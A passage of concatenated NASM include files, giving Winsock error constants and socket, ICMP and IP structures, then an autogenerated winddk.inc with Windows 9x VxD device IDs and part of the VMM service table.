WSAVERNOTSUPPORTED equ WSABASEERR+92
WSANOTINITIALISED equ WSABASEERR+93
WSAHOST_NOT_FOUND equ WSABASEERR+1001
HOST_NOT_FOUND equ WSAHOST_NOT_FOUND
WSATRY_AGAIN equ WSABASEERR+1002
TRY_AGAIN equ WSATRY_AGAIN
WSANO_RECOVERY equ WSABASEERR+1003
NO_RECOVERY equ WSANO_RECOVERY
WSANO_DATA equ WSABASEERR+1004
NO_DATA equ WSANO_DATA
WSANO_ADDRESS equ WSANO_DATA
NO_ADDRESS equ WSANO_ADDRESS
EWOULDBLOCK equ WSAEWOULDBLOCK
EINPROGRESS equ WSAEINPROGRESS
EALREADY equ WSAEALREADY
ENOTSOCK equ WSAENOTSOCK
EDESTADDRREQ equ WSAEDESTADDRREQ
EMSGSIZE equ WSAEMSGSIZE
EPROTOTYPE equ WSAEPROTOTYPE
ENOPROTOOPT equ WSAENOPROTOOPT
EPROTONOSUPPORT equ WSAEPROTONOSUPPORT
ESOCKTNOSUPPORT equ WSAESOCKTNOSUPPORT
EOPNOTSUPP equ WSAEOPNOTSUPP
EPFNOSUPPORT equ WSAEPFNOSUPPORT
EAFNOSUPPORT equ WSAEAFNOSUPPORT
EADDRINUSE equ WSAEADDRINUSE
EADDRNOTAVAIL equ WSAEADDRNOTAVAIL
ENETDOWN equ WSAENETDOWN
ENETUNREACH equ WSAENETUNREACH
ENETRESET equ WSAENETRESET
ECONNABORTED equ WSAECONNABORTED
ECONNRESET equ WSAECONNRESET
ENOBUFS equ WSAENOBUFS
EISCONN equ WSAEISCONN
ENOTCONN equ WSAENOTCONN
ESHUTDOWN equ WSAESHUTDOWN
ETOOMANYREFS equ WSAETOOMANYREFS
ETIMEDOUT equ WSAETIMEDOUT
ECONNREFUSED equ WSAECONNREFUSED
ELOOP equ WSAELOOP
ENAMETOOLONG equ WSAENAMETOOLONG
EHOSTDOWN equ WSAEHOSTDOWN
EHOSTUNREACH equ WSAEHOSTUNREACH
ENOTEMPTY equ WSAENOTEMPTY
EPROCLIM equ WSAEPROCLIM
EUSERS equ WSAEUSERS
EDQUOT equ WSAEDQUOT
ESTALE equ WSAESTALE
EREMOTE equ WSAEREMOTE
FD_SETSIZE equ 64
INVALID_SOCKET equ (-1-0)
SOCKET_ERROR equ -1
SOCKET_BUFFER_SIZE equ 512
ICMP_ECHOREPLY equ 0
ICMP_ECHOREQ equ 8
;------------------------wsock32 structures-----------------------------
STRUC fd_setstruc
.fd_count RESD 1
.fd_array RESD 1
ENDSTRUC

STRUC timeval
.tv_sec RESD 1
.tv_usec RESD 1
ENDSTRUC

STRUC sockaddr_in
.sin_family RESW 1
.sin_port RESW 1
.sin_addr RESD 1
.sin_zero RESB 8
ENDSTRUC

STRUC sockaddr
.sa_family RESW 1
.sa_data RESW 1
ENDSTRUC

STRUC WSAdata
.wVersion RESW 1
.wHighVersion RESW 1
.szDescription RESB WSADESCRIPTION_LEN+1
.szSystemStatus RESB WSASYS_STATUS_LEN+1
.iMaxSockets RESW 1
.iMaxUdpDg RESW 1
.lpVendorInfo RESD 1
ENDSTRUC

STRUC sockproto
.sp_family RESW 1
.sp_protocol RESW 1
ENDSTRUC

STRUC linger
.l_onoff RESW 1
.l_linger RESW 1
ENDSTRUC

STRUC hostentStru
.h_name RESD 1
.h_alias RESD 1
.h_addr RESW 1
.h_len RESW 1
.h_list RESD 1
ENDSTRUC

STRUC netent
.n_name RESD 1
.n_aliases RESD 1
.n_addrtype RESW 1
.n_net RESD 1
ENDSTRUC

STRUC servent
.s_name RESD 1
.s_aliases RESD 1
.s_port RESW 1
.s_proto RESD 1
ENDSTRUC

STRUC icmp_hdr
.icmp_type RESB 1
.icmp_code RESB 1
.icmp_cksum RESW 1
.icmp_id RESW 1
.icmp_seq RESW 1
.icmp_data RESB 1
ENDSTRUC

STRUC ip_hdr
.ip_hlv RESB 1
.ip_tos RESB 1
.ip_len RESW 1
.ip_id RESW 1
.ip_off RESW 1
.ip_ttl RESB 1
.ip_p RESB 1
.ip_cksum RESW 1
.ip_src RESD 1
.ip_dest RESD 1
ENDSTRUC

STRUC ICMP_OPTIONS
.Ttl RESB 1
.Tos RESB 1
.Flags RESB 1
.OptionsSize RESB 1
.OptionsData RESD 1
ENDSTRUC

STRUC ICMP_ECHO_REPLY
.Address RESD 1
.Status RESD 1
.RoundTripTime RESD 1
.DataSize RESW 1
.Reserved RESW 1
.DataPointer RESD 1
.Options RESD 1
.zData RESB 250
ENDSTRUC
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[WIN32N.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[WINDDK.INC]컴�
;///////////////////////////////////////////////////////////////////
;// winddk.inc
;//
;// This NASM include file has been autogenerated by VXDi2n
;// from Windows DDK Include direcrory ()
;//

%ifndef INCLUDED_WINDDK_INC__
%define INCLUDED_WINDDK_INC__

VMM_Device_ID equ	0x0001
DEBUG_Device_ID equ	0x0002
VPICD_Device_ID equ	0x0003
VDMAD_Device_ID equ	0x0004
VTD_Device_ID equ	0x0005
V86MMGR_Device_ID equ	0x0006
PageSwap_Device_ID equ	0x0007
PARITY_Device_ID equ	0x0008
REBOOT_Device_ID equ	0x0009
VDD_Device_ID equ	0x000a
VSD_Device_ID equ	0x000b
VMD_Device_ID equ	0x000c
VKD_Device_ID equ	0x000d
VCD_Device_ID equ	0x000e
VPD_Device_ID equ	0x000f
BlockDev_Device_ID equ	0x0010
VMCPD_Device_ID equ	0x0011
EBIOS_Device_ID equ	0x0012
BIOSXLAT_Device_ID equ	0x0013
VNETBIOS_Device_ID equ	0x0014
DOSMGR_Device_ID equ	0x0015
WINLOAD_Device_ID equ	0x0016
SHELL_Device_ID equ	0x0017
VMPoll_Device_ID equ	0x0018
VPROD_Device_ID equ	0x0019
DOSNET_Device_ID equ	0x001a
VFD_Device_ID equ	0x001b
VDD2_Device_ID equ	0x001c
WINDEBUG_Device_ID equ	0x001d
TSRLOAD_Device_ID equ	0x001e
BIOSHOOK_Device_ID equ	0x001f
Int13_Device_ID equ	0x0020
PageFile_Device_ID equ	0x0021
SCSI_Device_ID equ	0x0022
SCSIFD_Device_ID equ	0x0024
VPEND_Device_ID equ	0x0025
APM_Device_ID equ	0x0026
VXDLDR_Device_ID equ	0x0027
Ndis_Device_ID equ	0x0028
VWIN32_Device_ID equ	0x002a
VCOMM_Device_ID equ	0x002b
SPOOLER_Device_ID equ	0x002c
WIN32S_Device_ID equ	0x002d
DEBUGCMD_Device_ID equ	0x002e
CONFIGMG_Device_ID equ	0x0033
DWCFGMG_Device_ID equ	0x0034
SCSIPORT_Device_ID equ	0x0035
VFBACKUP_Device_ID equ	0x0036
ENABLE_Device_ID equ	0x0037
VCOND_Device_ID equ	0x0038
ISAPNP_Device_ID equ	0x003c
BIOS_Device_ID equ	0x003d
IFSMgr_Device_ID equ	0x0040
VCDFSD_Device_ID equ	0x0041
MRCI2_Device_ID equ	0x0042
PCI_Device_ID equ	0x0043
PELOADER_Device_ID equ	0x0044
EISA_Device_ID equ	0x0045
DRAGCLI_Device_ID equ	0x0046
DRAGSRV_Device_ID equ	0x0047
PERF_Device_ID equ	0x0048
AWREDIR_Device_ID equ	0x0049
DDS_Device_ID equ	0x004a
NTKERN_Device_ID equ	0x004b
VDOSKEYD_Device_ID equ	0x004b
ACPI_Device_ID equ	0x004c
UDF_Device_ID equ	0x004d
SMCLIB_Device_ID equ	0x004e
ETEN_Device_ID equ	0x0060
CHBIOS_Device_ID equ	0x0061
VMSGD_Device_ID equ	0x0062
VPPID_Device_ID equ	0x0063
VIME_Device_ID equ	0x0064
VHBIOSD_Device_ID equ	0x0065

Begin_Service_Table VMM	; 0x0001
  VMM_Service Get_VMM_Version                          ; 0x0000 ord
  VMM_Service Get_Cur_VM_Handle                        ; 0x0001 ord
  VMM_Service Test_Cur_VM_Handle                       ; 0x0002 ord
  VMM_Service Get_Sys_VM_Handle                        ; 0x0003 ord
  VMM_Service Test_Sys_VM_Handle                       ; 0x0004 ord
  VMM_Service Validate_VM_Handle                       ; 0x0005 ord
  VMM_Service Get_VMM_Reenter_Count                    ; 0x0006 ord
  VMM_Service Begin_Reentrant_Execution                ; 0x0007 ord
  VMM_Service End_Reentrant_Execution                  ; 0x0008 ord
  VMM_Service Install_V86_Break_Point                  ; 0x0009 ord
  VMM_Service Remove_V86_Break_Point                   ; 0x000a ord
  VMM_Service Allocate_V86_Call_Back                   ; 0x000b ord
  VMM_Service Allocate_PM_Call_Back                    ; 0x000c ord
  VMM_Service Call_When_VM_Returns                     ; 0x000d ord
  VMM_Service Schedule_Global_Event                    ; 0x000e ord
  VMM_Service Schedule_VM_Event                        ; 0x000f ord
  VMM_Service Call_Global_Event                        ; 0x0010 ord
  VMM_Service Call_VM_Event                            ; 0x0011 ord
  VMM_Service Cancel_Global_Event                      ; 0x0012 ord
  VMM_Service Cancel_VM_Event                          ; 0x0013 ord
  VMM_Service Call_Priority_VM_Event                   ; 0x0014 ord
  VMM_Service Cancel_Priority_VM_Event                 ; 0x0015 ord
  VMM_Service Get_NMI_Handler_Addr                     ; 0x0016 ord
  VMM_Service Set_NMI_Handler_Addr                     ; 0x0017 ord
  VMM_Service Hook_NMI_Event                           ; 0x0018 ord
  VMM_Service Call_When_VM_Ints_Enabled                ; 0x0019 ord
  VMM_Service Enable_VM_Ints                           ; 0x001a ord
  VMM_Service Disable_VM_Ints                          ; 0x001b ord
  VMM_Service Map_Flat                                 ; 0x001c ord
  VMM_Service Map_Lin_To_VM_Addr                       ; 0x001d ord
  VMM_Service Adjust_Exec_Priority                     ; 0x001e ord
  VMM_Service Begin_Critical_Section                   ; 0x001f ord
  VMM_Service End_Critical_Section                     ; 0x0020 ord
  VMM_Service End_Crit_And_Suspend                     ; 0x0021 ord
  VMM_Service Claim_Critical_Section                   ; 0x0022 ord
  VMM_Service Release_Critical_Section                 ; 0x0023 ord
  VMM_Service Call_When_Not_Critical                   ; 0x0024 ord
  VMM_Service Create_Semaphore                         ; 0x0025 ord
  VMM_Service Destroy_Semaphore                        ; 0x0026 ord
  VMM_Service Wait_Semaphore                           ; 0x0027 ord
  VMM_Service Signal_Semaphore                         ; 0x0028 ord
  VMM_Service Get_Crit_Section_Status                  ; 0x0029 ord
  VMM_Service Call_When_Task_Switched                  ; 0x002a ord
  VMM_Service Suspend_VM                               ; 0x002b ord
  VMM_Service Resume_VM                                ; 0x002c ord
  VMM_Service No_Fail_Resume_VM                        ; 0x002d ord
  VMM_Service Nuke_VM                                  ; 0x002e ord
  VMM_Service Crash_Cur_VM                             ; 0x002f ord
  VMM_Service Get_Execution_Focus                      ; 0x0030 ord
  VMM_Service Set_Execution_Focus                      ; 0x0031 ord
  VMM_Service Get_Time_Slice_Priority                  ; 0x0032 ord
  VMM_Service Set_Time_Slice_Priority                  ; 0x0033 ord
  VMM_Service Get_Time_Slice_Granularity               ; 0x0034 ord
  VMM_Service Set_Time_Slice_Granularity               ; 0x0035 ord
  VMM_Service Get_Time_Slice_Info                      ; 0x0036 ord
  VMM_Service Adjust_Execution_Time                    ; 0x0037 ord
  VMM_Service Release_Time_Slice                       ; 0x0038 ord
  VMM_Service Wake_Up_VM                               ; 0x0039 ord
  VMM_Service Call_When_Idle                           ; 0x003a ord
  VMM_Service Get_Next_VM_Handle                       ; 0x003b ord
  VMM_Service Set_Global_Time_Out                      ; 0x003c ord
  VMM_Service Set_VM_Time_Out                          ; 0x003d ord
  VMM_Service Cancel_Time_Out                          ; 0x003e ord
  VMM_Service Get_System_Time                          ; 0x003f ord
  VMM_Service Get_VM_Exec_Time                         ; 0x0040 ord
  VMM_Service Hook_V86_Int_Chain                       ; 0x0041 ord
  VMM_Service Get_V86_Int_Vector                       ; 0x0042 ord
  VMM_Service Set_V86_Int_Vector                       ; 0x0043 ord
  VMM_Service Get_PM_Int_Vector                        ; 0x0044 ord
  VMM_Service Set_PM_Int_Vector                        ; 0x0045 ord
  VMM_Service Simulate_Int                             ; 0x0046 ord
  VMM_Service Simulate_Iret                            ; 0x0047 ord
  VMM_Service Simulate_Far_Call                        ; 0x0048 ord
  VMM_Service Simulate_Far_Jmp                         ; 0x0049 ord
  VMM_Service Simulate_Far_Ret                         ; 0x004a ord
  VMM_Service Simulate_Far_Ret_N                       ; 0x004b ord
  VMM_Service Build_Int_Stack_Frame                    ; 0x004c ord
  VMM_Service Simulate_Push                            ; 0x004d ord
  VMM_Service Simulate_Pop                             ; 0x004e ord
  VMM_Service _HeapAllocate                            ; 0x004f ord
  VMM_Service _HeapReAllocate                          ; 0x0050 ord
  VMM_Service _HeapFree                                ; 0x0051 ord
  VMM_Service _HeapGetSize                             ; 0x0052 ord
  VMM_Service _PageAllocate                            ; 0x0053 ord
  VMM_Service _PageReAllocate                          ; 0x0054 ord
  VMM_Service _PageFree                                ; 0x0055 ord
  VMM_Service _PageLock                                ; 0x0056 ord
  VMM_Service _PageUnLock                              ; 0x0057 ord
  VMM_Service _PageGetSizeAddr                         ; 0x0058 ord
  VMM_Service _PageGetAllocInfo                        ; 0x0059 ord
  VMM_Service _GetFreePageCount                        ; 0x005a ord
  VMM_Service _GetSysPageCount                         ; 0x005b ord
  VMM_Service _GetVMPgCount                            ; 0x005c ord
  VMM_Service _MapIntoV86                              ; 0x005d ord
  VMM_Service _PhysIntoV86                             ; 0x005e ord
  VMM_Service _TestGlobalV86Mem                        ; 0x005f ord
  VMM_Service _ModifyPageBits                          ; 0x0060 ord
  VMM_Service _CopyPageTable                           ; 0x0061 ord
  VMM_Service _LinMapIntoV86                           ; 0x0062 ord
  VMM_Service _LinPageLock                             ; 0x0063 ord
  VMM_Service _LinPageUnLock                           ; 0x0064 ord
  VMM_Service _SetResetV86Pageable                     ; 0x0065 ord
  VMM_Service _GetV86PageableArray                     ; 0x0066 ord
  VMM_Service _PageCheckLinRange                       ; 0x0067 ord
  VMM_Service _PageOutDirtyPages                       ; 0x0068 ord
  VMM_Service _PageDiscardPages                        ; 0x0069 ord
  VMM_Service _GetNulPageHandle                        ; 0x006a ord
  VMM_Service _GetFirstV86Page                         ; 0x006b ord
  VMM_Service _MapPhysToLinear                         ; 0x006c ord
  VMM_Service _GetAppFlatDSAlias                       ; 0x006d ord
  VMM_Service _SelectorMapFlat                         ; 0x006e ord
  VMM_Service _GetDemandPageInfo                       ; 0x006f ord
  VMM_Service _GetSetPageOutCount                      ; 0x0070 ord
  VMM_Service Hook_V86_Page                            ; 0x0071 ord
  VMM_Service _Assign_Device_V86_Pages                 ; 0x0072 ord
  VMM_Service _DeAssign_Device_V86_Pages               ; 0x0073 ord
  VMM_Service _Get_Device_V86_Pages_Array              ; 0x0074 ord
  VMM_Service MMGR_SetNULPageAddr                      ; 0x0075 ord
  VMM_Service _Allocate_GDT_Selector                   ; 0x0076 ord
  VMM_Service _Free_GDT_Selector                       ; 0x0077 ord
  VMM_Service _Allocate_LDT_Selector                   ; 0x0078 ord
  VMM_Service _Free_LDT_Selector                       ; 0x0079 ord
  VMM_Service _BuildDescriptorDWORDs                   ; 0x007a ord
  VMM_Service _GetDescriptor                           ; 0x007b ord
  VMM_Service _SetDescriptor                           ; 0x007c ord
  VMM_Service _MMGR_Toggle_HMA                         ; 0x007d ord
  VMM_Service Get_Fault_Hook_Addrs                     ; 0x007e ord
  VMM_Service Hook_V86_Fault                           ; 0x007f ord
  VMM_Service Hook_PM_Fault                            ; 0x0080 ord
  VMM_Service Hook_VMM_Fault                           ; 0x0081 ord
  VMM_Service Begin_Nest_V86_Exec                      ; 0x0082 ord
  VMM_Service Begin_Nest_Exec                          ; 0x0083 ord
  VMM_Service Exec_Int                                 ; 0x0084 ord
  VMM_Service Resume_Exec                              ; 0x0085 ord
  VMM_Service End_Nest_Exec                            ; 0x0086 ord
  VMM_Service Allocate_PM_App_CB_Area                  ; 0x0087 ord
  VMM_Service Get_Cur_PM_App_CB                        ; 0x0088 ord
  VMM_Service Set_V86_Exec_Mode                        ; 0x0089 ord
  VMM_Service Set_PM_Exec_Mode                         ; 0x008a ord
  VMM_Service Begin_Use_Locked_PM_Stack                ; 0x008b ord
  VMM_Service End_Use_Locked_PM_Stack                  ; 0x008c ord
  VMM_Service Save_Client_State                        ; 0x008d ord
  VMM_Service Restore_Client_State                     ; 0x008e ord
  VMM_Service Exec_VxD_Int                             ; 0x008f ord
  VMM_Service Hook_Device_Service                      ; 0x0090 ord
  VMM_Service Hook_Device_V86_API                      ; 0x0091 ord
  VMM_Service Hook_Device_PM_API                       ; 0x0092 ord
  VMM_Service System_Control                           ; 0x0093 ord
  VMM_Service Simulate_IO                              ; 0x0094 ord
  VMM_Service Install_Mult_IO_Handlers                 ; 0x0095 ord
  VMM_Service Install_IO_Handler                       ; 0x0096 ord
  VMM_Service Enable_Global_Trapping                   ; 0x0097 ord
  VMM_Service Enable_Local_Trapping                    ; 0x0098 ord
  VMM_Service Disable_Global_Trapping                  ; 0x0099 ord
  VMM_Service Disable_Local_Trapping                   ; 0x009a ord
  VMM_Service List_Create                              ; 0x009b ord
  VMM_Service List_Destroy                             ; 0x009c ord
  VMM_Service List_Allocate                            ; 0x009d ord
  VMM_Service List_Attach                              ; 0x009e ord
  VMM_Service List_Attach_Tail                         ; 0x009f ord
  VMM_Service List_Insert                              ; 0x00a0 ord
  VMM_Service List_Remove                              ; 0x00a1 ord
  VMM_Service List_Deallocate                          ; 0x00a2 ord
  VMM_Service List_Get_First                           ; 0x00a3 ord
  VMM_Service List_Get_Next                            ; 0x00a4 ord
  VMM_Service List_Remove_First                        ; 0x00a5 ord
  VMM_Service _AddInstanceItem                         ; 0x00a6 ord
  VMM_Service _Allocate_Device_CB_Area                 ; 0x00a7 ord
  VMM_Service _Allocate_Global_V86_Data_Area           ; 0x00a8 ord
  VMM_Service _Allocate_Temp_V86_Data_Area             ; 0x00a9 ord
  VMM_Service _Free_Temp_V86_Data_Area                 ; 0x00aa ord
  VMM_Service Get_Profile_Decimal_Int                  ; 0x00ab ord
  VMM_Service Convert_Decimal_String                   ; 0x00ac ord
  VMM_Service Get_Profile_Fixed_Point                  ; 0x00ad ord
  VMM_Service Convert_Fixed_Point_String               ; 0x00ae ord
  VMM_Service Get_Profile_Hex_Int                      ; 0x00af ord
  VMM_Service Convert_Hex_String                       ; 0x00b0 ord
  VMM_Service Get_Profile_Boolean                      ; 0x00b1 ord
  VMM_Service Convert_Boolean_String                   ; 0x00b2 ord
  VMM_Service Get_Profile_String                       ; 0x00b3 ord
  VMM_Service Get_Next_Profile_String                  ; 0x00b4 ord
  VMM_Service Get_Environment_String                   ; 0x00b5 ord
  VMM_Service Get_Exec_Path                            ; 0x00b6 ord
  VMM_Service Get_Config_Directory                     ; 0x00b7 ord
  VMM_Service OpenFile                                 ; 0x00b8 ord
  VMM_Service Get_PSP_Segment                          ; 0x00b9 ord
  VMM_Service GetDOSVectors                            ; 0x00ba ord
  VMM_Service Get_Machine_Info                         ; 0x00bb ord
  VMM_Service GetSet_HMA_Info                          ; 0x00bc ord
  VMM_Service Set_System_Exit_Code                     ; 0x00bd ord
  VMM_Service Fatal_Error_Handler                      ; 0x00be ord
  VMM_Service Fatal_Memory_Error                       ; 0x00bf ord
  VMM_Service Update_System_Clock                      ; 0x00c0 ord
  VMM_Service Test_Debug_Installed                     ; 0x00c1 ord
  VMM_Service Out_Debug_String                         ; 0x00c2 ord
  VMM_Service Out_Debug_Chr                            ; 0x00c3 ord
  VMM_Service In_Debug_Chr                             ; 0x00c4 ord
  VMM_Service Debug_Convert_Hex_Binary                 ; 0x00c5 ord
  VMM_Service Debug_Convert_Hex_Decimal                ; 0x00c6 ord
  VMM_Service Debug_Test_Valid_Handle                  ; 0x00c7 ord
  VMM_Service Validate_Client_Ptr                      ; 0x00c8 ord
  VMM_Service Test_Reenter                             ; 0x00c9 ord
  VMM_Service Queue_Debug_String                       ; 0x00ca ord
  VMM_Service Log_Proc_Call                            ; 0x00cb ord
  VMM_Service Debug_Test_Cur_VM                        ; 0x00cc ord
  VMM_Service Get_PM_Int_Type                          ; 0x00cd ord
  VMM_Service Set_PM_Int_Type                          ; 0x00ce ord
  VMM_Service Get_Last_Updated_System_Time             ; 0x00cf ord
  VMM_Service Get_Last_Updated_VM_Exec_Time            ; 0x00d0 ord
  VMM_Service Test_DBCS_Lead_Byte                      ; 0x00d1 ord
  VMM_Service _AddFreePhysPage                         ; 0x00d2 ord
  VMM_Service _PageResetHandlePAddr                    ; 0x00d3 ord
  VMM_Service _SetLastV86Page                          ; 0x00d4 ord
  VMM_Service _GetLastV86Page                          ; 0x00d5 ord
  VMM_Service _MapFreePhysReg                          ; 0x00d6 ord
  VMM_Service _UnmapFreePhysReg                        ; 0x00d7 ord
  VMM_Service _XchgFreePhysReg                         ; 0x00d8 ord
  VMM_Service _SetFreePhysRegCalBk                     ; 0x00d9 ord
  VMM_Service Get_Next_Arena                           ; 0x00da ord
  VMM_Service Get_Name_Of_Ugly_TSR                     ; 0x00db ord
  VMM_Service Get_Debug_Options                        ; 0x00dc ord
  VMM_Service Set_Physical_HMA_Alias                   ; 0x00dd ord
  VMM_Service _GetGlblRng0V86IntBase                   ; 0x00de ord
  VMM_Service _Add_Global_V86_Data_Area                ; 0x00df ord
  VMM_Service GetSetDetailedVMError                    ; 0x00e0 ord
  VMM_Service Is_Debug_Chr                             ; 0x00e1 ord
  VMM_Service Clear_Mono_Screen                        ; 0x00e2 ord
  VMM_Service Out_Mono_Chr                             ; 0x00e3 ord
  VMM_Service Out_Mono_String                          ; 0x00e4 ord
  VMM_Service Set_Mono_Cur_Pos                         ; 0x00e5 ord
  VMM_Service Get_Mono_Cur_Pos                         ; 0x00e6 ord
  VMM_Service Get_Mono_Chr                             ; 0x00e7 ord
  VMM_Service Locate_Byte_In_ROM                       ; 0x00e8 ord
  VMM_Service Hook_Invalid_Page_Fault                  ; 0x00e9 ord
  VMM_Service Unhook_Invalid_Page_Fault                ; 0x00ea ord
  VMM_Service Set_Delete_On_Exit_File                  ; 0x00eb ord
  VMM_Service Close_VM                                 ; 0x00ec ord
  VMM_Service Enable_Touch_1st_Meg                     ; 0x00ed ord
  VMM_Service Disable_Touch_1st_Meg                    ; 0x00ee ord
  VMM_Service Install_Exception_Handler                ; 0x00ef ord
  VMM_Service Remove_Exception_Handler                 ; 0x00f0 ord
  VMM_Service Get_Crit_Status_No_Block                 ; 0x00f1 ord
  VMM_Service _GetLastUpdatedThreadExecTime            ; 0x00f2 ord
  VMM_Service _Trace_Out_Service                       ; 0x00f3 ord
  VMM_Service _Debug_Out_Service                       ; 0x00f4 ord
  VMM_Service _Debug_Flags_Service                     ; 0x00f5 ord
  VMM_Service VMMAddImportModuleName                   ; 0x00f6 ord
  VMM_Service VMM_Add_DDB                              ; 0x00f7 ord
  VMM_Service VMM_Remove_DDB                           ; 0x00f8 ord
  VMM_Service Test_VM_Ints_Enabled                     ; 0x00f9 ord
  VMM_Service _BlockOnID                               ; 0x00fa ord
  VMM_Service Schedule_Thread_Event                    ; 0x00fb ord
  VMM_Service Cancel_Thread_Event                      ; 0x00fc ord
  VMM_Service Set_Thread_Time_Out                      ; 0x00fd ord
  VMM_Service Set_Async_Time_Out                       ; 0x00fe ord
  VMM_Service _AllocateThreadDataSlot                  ; 0x00ff ord
  VMM_Service _FreeThreadDataSlot                      ; 0x0100 ord
  VMM_Service _CreateMutex                             ; 0x0101 ord
  VMM_Service _DestroyMutex                            ; 0x0102 ord
  VMM_Service _GetMutexOwner                           ; 0x0103 ord
  VMM_Service Call_When_Thread_Switched                ; 0x0104 ord
  VMM_Service VMMCreateThread                          ; 0x0105 ord
  VMM_Service _GetThreadExecTime                       ; 0x0106 ord
  VMM_Service VMMTerminateThread                       ; 0x0107 ord
  VMM_Service Get_Cur_Thread_Handle                    ; 0x0108 ord
  VMM_Service Test_Cur_Thread_Handle                   ; 0x0109 ord
  VMM_Service Get_Sys_Thread_Handle                    ; 0x010a ord
  VMM_Service Test_Sys_Thread_Handle                   ; 0x010b ord
  VMM_Service Validate_Thread_Handle                   ; 0x010c ord
  VMM_Service Get_Initial_Thread_Handle                ; 0x010d ord
  VMM_Service Test_Initial_Thread_Handle               ; 0x010e ord
  VMM_Service Debug_Test_Valid_Thread_Handle           ; 0x010f ord
  VMM_Service Debug_Test_Cur_Thread                    ; 0x0110 ord
  VMM_Service VMM_GetSystemInitState                   ; 0x0111 ord
  VMM_Service Cancel_Call_When_Thread_Switched         ; 0x0112 ord
  VMM_Service Get_Next_Thread_Handle                   ; 0x0113 ord
  VMM_Service Adjust_Thread_Exec_Priority              ; 0x0114 ord
  VMM_Service _Deallocate_Device_CB_Area               ; 0x0115 ord
  VMM_Service Remove_IO_Handler                        ; 0x0116 ord
  VMM_Service Remove_Mult_IO_Handlers                  ; 0x0117 ord
  VMM_Service Unhook_V86_Int_Chain                     ; 0x0118 ord
  VMM_Service Unhook_V86_Fault                         ; 0x0119 ord
  VMM_Service Unhook_PM_Fault                          ; 0x011a ord
  VMM_Service Unhook_VMM_Fault                         ; 0x011b ord
  VMM_Service Unhook_Device_Service                    ; 0x011c ord
  VMM_Service _PageReserve                             ; 0x011d ord
  VMM_Service _PageCommit                              ; 0x011e ord
  VMM_Service _PageDecommit                            ; 0x011f ord
  VMM_Service _PagerRegister                           ; 0x0120 ord
  VMM_Service _PagerQuery                              ; 0x0121 ord
  VMM_Service _PagerDeregister                         ; 0x0122 ord
  VMM_Service _ContextCreate                           ; 0x0123 ord
  VMM_Service _ContextDestroy                          ; 0x0124 ord
  VMM_Service _PageAttach                              ; 0x0125 ord
  VMM_Service _PageFlush                               ; 0x0126 ord
  VMM_Service _SignalID                                ; 0x0127 ord
  VMM_Service _PageCommitPhys                          ; 0x0128 ord
  VMM_Service _Register_Win32_Services                 ; 0x0129 ord
  VMM_Service Cancel_Call_When_Not_Critical            ; 0x012a ord
  VMM_Service Cancel_Call_When_Idle                    ; 0x012b ord
  VMM_Service Cancel_Call_When_Task_Switched           ; 0x012c ord
  VMM_Service _Debug_Printf_Service                    ; 0x012d ord
  VMM_Service _EnterMutex                              ; 0x012e ord
  VMM_Service _LeaveMutex                              ; 0x012f ord
  VMM_Service Simulate_VM_IO                           ; 0x0130 ord
  VMM_Service Signal_Semaphore_No_Switch               ; 0x0131 ord
  VMM_Service _ContextSwitch                           ; 0x0132 ord
  VMM_Service _PageModifyPermissions                   ; 0x0133 ord
  VMM_Service _PageQuery                               ; 0x0134 ord
  VMM_Service _EnterMustComplete                       ; 0x0135 ord
  VMM_Service _LeaveMustComplete                       ; 0x0136 ord
  VMM_Service _ResumeExecMustComplete                  ; 0x0137 ord
  VMM_Service _GetThreadTerminationStatus              ; 0x0138 ord
  VMM_Service _GetInstanceInfo                         ; 0x0139 ord
  VMM_Service _ExecIntMustComplete                     ; 0x013a ord
  VMM_Service _ExecVxDIntMustComplete                  ; 0x013b ord
  VMM_Service Begin_V86_Serialization                  ; 0x013c ord
  VMM_Service Unhook_V86_Page                          ; 0x013d ord
  VMM_Service VMM_GetVxDLocationList                   ; 0x013e ord
  VMM_Service VMM_GetDDBList                           ; 0x013f ord
  VMM_Service Unhook_NMI_Event                         ; 0x0140 ord
  VMM_Service Get_Instanced_V86_Int_Vector             ; 0x0141 ord
  VMM_Service Get_Set_Real_DOS_PSP                     ; 0x0142 ord
  VMM_Service Call_Priority_Thread_Event               ; 0x0143 ord
  VMM_Service Get_System_Time_Address                  ; 0x0144 ord
  VMM_Service Get_Crit_Status_Thread                   ; 0x0145 ord
  VMM_Service Get_DDB                                  ; 0x0146 ord
  VMM_Service Directed_Sys_Control                     ; 0x0147 ord
  VMM_Service _RegOpenKey                              ; 0x0148 ord
  VMM_Service _RegCloseKey                             ; 0x0149 ord
  VMM_Service _RegCreateKey                            ; 0x014a ord
  VMM_Service _RegDeleteKey                            ; 0x014b ord
  VMM_Service _RegEnumKey                              ; 0x014c ord
  VMM_Service _RegQueryValue                           ; 0x014d ord
  VMM_Service _RegSetValue                             ; 0x014e ord
  VMM_Service _RegDeleteValue                          ; 0x014f ord
  VMM_Service _RegEnumValue                            ; 0x0150 ord
  VMM_Service _RegQueryValueEx                         ; 0x0151 ord
  VMM_Service _RegSetValueEx                           ; 0x0152 ord
  VMM_Service _CallRing3                               ; 0x0153 ord
  VMM_Service Exec_PM_Int                              ; 0x0154 ord
  VMM_Service _RegFlushKey                             ; 0x0155 ord
  VMM_Service _PageCommitContig                        ; 0x0156 ord
  VMM_Service _GetCurrentContext                       ; 0x0157 ord
  VMM_Service _LocalizeSprintf                         ; 0x0158 ord
  VMM_Service _LocalizeStackSprintf                    ; 0x0159 ord
  VMM_Service Call_Restricted_Event                    ; 0x015a ord
  VMM_Service Cancel_Restricted_Event                  ; 0x015b ord
  VMM_Service Register_PEF_Provider                    ; 0x015c ord
  VMM_Service _GetPhysPageInfo                         ; 0x015d ord
  VMM_Service _RegQueryInfoKey                         ; 0x015e ord
  VMM_Service MemArb_Reserve_Pages                     ; 0x015f ord
  VMM_Service Time_Slice_Sys_VM_Idle                   ; 0x0160 ord
  VMM_Service Time_Slice_Sleep                         ; 0x0161 ord
  VMM_Service Boost_With_Decay                         ; 0x0162 ord
  VMM_Service Set_Inversion_Pri                        ; 0x0163 ord
  VMM_Service Reset_Inversion_Pri                      ; 0x0164 ord
  VMM_Service Release_Inversion_Pri                    ; 0x0165 ord
  VMM_Service Get_Thread_Win32_Pri                     ; 0x0166 ord
  VMM_Service Set_Thread_Win32_Pri                     ; 0x0167 ord
  VMM_Service Set_Thread_Static_Boost                  ; 0x0168 ord
